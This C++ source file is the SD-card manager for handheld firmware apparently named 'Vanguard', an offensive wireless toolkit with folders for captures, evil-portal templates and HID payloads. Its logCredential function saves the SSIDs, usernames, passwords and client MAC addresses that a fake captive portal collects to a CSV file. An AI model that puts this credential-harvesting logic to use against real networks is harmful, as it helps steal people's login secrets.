#include "SDManager.h"
#include <M5Cardputer.h>

namespace Vanguard {

SDManager::SDManager() : m_initialized(false) {
    m_fileMutex = xSemaphoreCreateMutex();
}

SDManager& SDManager::getInstance() {
    static SDManager instance;
    return instance;
}

bool SDManager::init() {
    if (m_initialized) return true;

    // Cardputer SD pins (usually handled by M5Cardputer.begin)
    // CS: 12, MOSI: 14, SCK: 40, MISO: 39
    
    if (Serial) Serial.println("[SD] Mounting...");

    // Try to mount SD
    if (!SD.begin(12, SPI, 40000000)) {
        if (Serial) Serial.println("[SD] ERROR: Mount failed!");
        return false;
    }

    if (Serial) {
        uint8_t cardType = SD.cardType();
        Serial.printf("[SD] Mounted (Type: %d, Size: %lluMB)\n", 
                      cardType, SD.cardSize() / (1024 * 1024));
    }

    m_initialized = true;
    createFolderStructure();
    return true;
}

bool SDManager::isAvailable() const {
    return m_initialized;
}

bool SDManager::ensureDirectory(const char* path) {
    if (!SD.exists(path)) {
        if (Serial) Serial.printf("[SD] Creating dir: %s\n", path);
        return SD.mkdir(path);
    }
    return true;
}

void SDManager::createFolderStructure() {
    ensureDirectory("/vanguard");
    ensureDirectory("/vanguard/captures");
    ensureDirectory("/vanguard/evil_portal");
    ensureDirectory("/vanguard/evil_portal/templates");
    ensureDirectory("/vanguard/logs");
    ensureDirectory("/vanguard/hid_payloads");
}

bool SDManager::appendToFile(const char* path, const char* data) {
    if (!m_initialized) return false;

    if (xSemaphoreTake(m_fileMutex, pdMS_TO_TICKS(500)) != pdTRUE) return false;

    File file = SD.open(path, FILE_APPEND);
    if (!file) {
        xSemaphoreGive(m_fileMutex);
        if (Serial) Serial.printf("[SD] ERROR: Failed to open %s for append\n", path);
        return false;
    }

    bool success = file.println(data);
    file.close();
    xSemaphoreGive(m_fileMutex);
    return success;
}

String SDManager::readFile(const char* path, size_t maxBytes) {
    if (!m_initialized) return "";

    File file = SD.open(path, FILE_READ);
    if (!file) {
        if (Serial) Serial.printf("[SD] ERROR: Failed to open %s for read\n", path);
        return "";
    }

    if (file.size() > maxBytes) {
        file.close();
        if (Serial) Serial.printf("[SD] WARN: %s too large (%u > %u)\n", path, file.size(), maxBytes);
        return "";
    }

    String content = file.readString();
    file.close();
    return content;
}

bool SDManager::fileExists(const char* path) {
    return SD.exists(path);
}

bool SDManager::logCredential(const char* ssid, const char* user, const char* pass, const char* mac) {
    char entry[256];
    // Format: Timestamp,SSID,User,Pass,ClientMac
    snprintf(entry, sizeof(entry), "%lu,%s,%s,%s,%s", 
             millis(), ssid, user, pass, mac);
    
    return appendToFile("/vanguard/evil_portal/credentials.csv", entry);
}

} // namespace Vanguard
